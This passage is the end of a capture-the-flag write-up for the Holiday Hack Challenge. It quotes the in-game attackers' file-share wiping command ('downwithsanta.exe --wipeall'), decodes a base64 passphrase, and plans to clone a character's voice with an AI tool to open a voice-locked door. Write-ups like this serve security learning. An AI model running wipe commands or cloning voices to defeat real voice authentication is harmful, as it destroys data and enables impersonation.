+<code>C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$</code></p><p><strong>What is the name of the executable the attackers used in the final malicious command?</strong>
+<code>downwithsanta.exe</code></p><p><strong>What was the command line flag used alongside this executable?</strong>
+<code>--wipeall</code></p><h2 id=final>Final
+<a class=header-link href=#final><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>To earn credit for your fantastic work, return to the Holiday Hack Challenge and
+enter the secret phrase which is the result of running this query:
+<code>print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')</code></p><p>Answer: <code>Beware the Cube that Wombles</code>.</p><h1 id=space-island-door-access-speaker>Space Island Door Access Speaker
+<a class=header-link href=#space-island-door-access-speaker><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>There's a door that needs opening on Space Island! Talk to Jewel Loggins there
+for more information.</p></blockquote><p>The secret passphrase is from <code>Certificate SSHenanigans</code>.</p><pre tabindex=0><code># cat InstructionsForEnteringSatelliteGroundStation.txt
+Note to self:
+
+To enter the Satellite Ground Station (SGS), say the following into the speaker:
+
+And he whispered, &#39;Now I shall be out of sight;
+So through the valley and over the height.&#39;
+And he&#39;ll silently take his way.
+</code></pre><p>We need to upload a wav file that says the passphrase (all of that text and not
+just the quote) in Wombley's voice. We have his sound in the audiobook he gave
+us so we need to find an AI that can do analyze it and make a file for us.</p><p><a href=https://play.ht/ target=_blank rel="noreferrer noopener">https://play.ht/</a> is in the first hint for this year's holiday hack.</p><h1 id=game-cartridges-vol-1>Game Cartridges: Vol 1
+<a class=header-link href=#game-cartridges-vol-1><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Find the first Gamegosling cartridge and beat the game</p><p>The first one is in Tarnished Cove</p><p>It's a block move game.</p></div><footer><p class=meta><span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
+<time>Jan 10, 2024</time></span></p><p class=meta><a class="basic-alignment left" href=https://parsiya.net/blog/2023-10-28-semgreps-experimental-rule-syntax/ title="Semgrep's Experimental Rule Syntax">Semgrep's Experimental Rule Syntax</a></p><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//parsiya.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></footer></article></div><aside class="sidebar thirds"><section class="first odd"><h1>Who am I?</h1><p><p>I am Parsia, an application security engineer.</p><p>I write about application security, cryptography, static analysis, and
+(of course) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="me noopener noreferrer" href=https://infosec.exchange/@parsiya title=https://infosec.exchange/@parsiya><i class="fa fa-mastodon fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
+<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/semgrep/ title=Semgrep>Semgrep</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/blockchain/ title="Blockchain (lol)">Blockchain (lol)</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title="WinAppDbg (use Frida instead)">WinAppDbg (use Frida instead)</a></li><li><a href=https://awsome.pw title='AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability'>AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2024 Parsia - <a href=https://parsiya.net/license/>License</a> -
+<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>
